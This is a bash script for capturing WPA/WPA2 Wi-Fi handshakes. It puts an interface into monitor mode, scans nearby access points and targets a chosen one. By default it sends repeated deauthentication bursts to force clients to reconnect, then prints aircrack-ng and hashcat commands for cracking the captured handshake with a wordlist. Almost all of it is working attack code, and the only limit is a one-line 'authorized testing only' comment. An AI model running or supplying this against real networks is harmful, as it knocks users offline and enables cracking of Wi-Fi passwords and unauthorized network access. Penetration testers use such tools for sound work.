#!/bin/bash
# WPA/WPA2 Handshake Capture
# Authorized security testing only

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
mkdir -p "$BASE_DIR/capture"
MON=""
IFACE=""

cleanup() {
    echo -e "\n${YELLOW}[*] Stopping capture...${NC}"
    pkill -f "airodump-ng" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    if [ -n "$MON" ]; then
        airmon-ng stop "$MON" >/dev/null 2>&1 || true
    fi
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start NetworkManager 2>/dev/null || true
    fi
}
trap cleanup INT TERM

echo -e "${CYAN}"
echo "╔════════════════════════════════════╗"
echo "║      WPA Handshake Capture         ║"
echo "╚════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}Interfaces:${NC}"
iw dev 2>/dev/null | awk '/Interface/{print "  "$2}'
echo ""
read -rp "Interface (e.g. wlan0): " IFACE
[ -z "$IFACE" ] && exit 1

airmon-ng check kill >/dev/null 2>&1 || true
airmon-ng start "$IFACE" >/dev/null 2>&1 || true
MON="${IFACE}mon"
[ ! -e "/sys/class/net/$MON" ] && MON="$IFACE"
echo -e "${BLUE}[*] Monitor: $MON${NC}"

SCAN_FILE="$BASE_DIR/capture/hs_scan_$(date +%Y%m%d_%H%M%S)"
echo -e "${GREEN}[+] Scanning 15s...${NC}"
timeout 15 airodump-ng --output-format csv -w "$SCAN_FILE" "$MON" 2>/dev/null || true

CSV=$(ls -1 "${SCAN_FILE}"*.csv 2>/dev/null | head -n1)
if [ -n "$CSV" ]; then
    echo -e "\n${GREEN}APs:${NC}"
    awk -F',' '
      BEGIN{printf "%-3s %-18s %-6s %-8s %-20s\n","#","BSSID","CH","PRIV","ESSID"}
      /Station MAC/{exit}
      NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
        i++; b=$1; ch=$4; priv=$6; ess=$14
        gsub(/^[ \t]+|[ \t]+$/,"",b)
        gsub(/^[ \t]+|[ \t]+$/,"",ch)
        gsub(/^[ \t]+|[ \t]+$/,"",priv)
        gsub(/^[ \t]+|[ \t]+$/,"",ess)
        printf "%-3s %-18s %-6s %-8s %-20s\n", i,b,ch,priv,ess
        print i","b","ch","ess >> "/tmp/wifitool_hs_map.txt"
      }' "$CSV"
fi

rm -f /tmp/wifitool_hs_map.txt
[ -n "$CSV" ] && awk -F',' '
  /Station MAC/{exit}
  NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
    i++; b=$1; ch=$4; ess=$14
    gsub(/^[ \t]+|[ \t]+$/,"",b)
    gsub(/^[ \t]+|[ \t]+$/,"",ch)
    gsub(/^[ \t]+|[ \t]+$/,"",ess)
    print i","b","ch","ess
  }' "$CSV" > /tmp/wifitool_hs_map.txt

echo ""
read -rp "BSSID or #: " INPUT
if [[ "$INPUT" =~ ^[0-9]+$ ]] && [ -f /tmp/wifitool_hs_map.txt ]; then
    LINE=$(grep "^${INPUT}," /tmp/wifitool_hs_map.txt | head -n1)
    BSSID=$(echo "$LINE" | cut -d, -f2)
    CHANNEL=$(echo "$LINE" | cut -d, -f3)
    ESSID=$(echo "$LINE" | cut -d, -f4-)
else
    BSSID="$INPUT"
    read -rp "Channel: " CHANNEL
    read -rp "ESSID: " ESSID
fi

[ -z "$BSSID" ] || [ -z "$CHANNEL" ] && echo -e "${RED}Need BSSID+Channel${NC}" && exit 1

SAFE_ESSID=$(echo "${ESSID:-target}" | tr -cd '[:alnum:]_.-' | cut -c1-32)
OUT="$BASE_DIR/capture/${SAFE_ESSID}_$(date +%H%M%S)"

echo -e "${GREEN}[+] Capturing on ch $CHANNEL BSSID $BSSID${NC}"
echo -e "${YELLOW}    Output prefix: $OUT${NC}"

# start airodump focused
airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$OUT" "$MON" &
AIRO_PID=$!
sleep 3

echo ""
echo -e "${YELLOW}Send deauth to force handshake? (y/n) [y]:${NC}"
read -rp "> " DO_DEAUTH
DO_DEAUTH=${DO_DEAUTH:-y}

if [ "$DO_DEAUTH" = "y" ] || [ "$DO_DEAUTH" = "Y" ]; then
    read -rp "Deauth bursts (times) [5]: " BURSTS
    BURSTS=${BURSTS:-5}
    for i in $(seq 1 "$BURSTS"); do
        echo -e "${RED}[*] Deauth burst $i/$BURSTS${NC}"
        aireplay-ng --deauth 10 -a "$BSSID" "$MON" --ignore-negative-one >/dev/null 2>&1 || true
        sleep 3
    done
fi

echo -e "${CYAN}[+] Listening for handshake. When WPA handshake appears in airodump, Ctrl+C.${NC}"
echo -e "${CYAN}    Or wait 60s auto-stop...${NC}"
sleep 60
kill "$AIRO_PID" 2>/dev/null || true
wait "$AIRO_PID" 2>/dev/null || true

CAP=$(ls -1 "${OUT}"*.cap 2>/dev/null | head -n1)
if [ -n "$CAP" ]; then
    echo -e "${GREEN}[+] Capture file: $CAP${NC}"
    if command -v aircrack-ng >/dev/null 2>&1; then
        echo -e "${BLUE}[*] Checking for handshake...${NC}"
        aircrack-ng "$CAP" | head -n 40
    fi
    echo ""
    echo -e "${YELLOW}Crack example:${NC}"
    echo "  aircrack-ng -w /path/to/wordlist.txt \"$CAP\""
    echo "  # or convert then hashcat:"
    echo "  hcxpcapngtool -o hash.hc22000 \"$CAP\""
    echo "  hashcat -m 22000 hash.hc22000 wordlist.txt"
else
    echo -e "${RED}[!] No .cap file found${NC}"
fi

cleanup
echo -e "${GREEN}Done.${NC}"
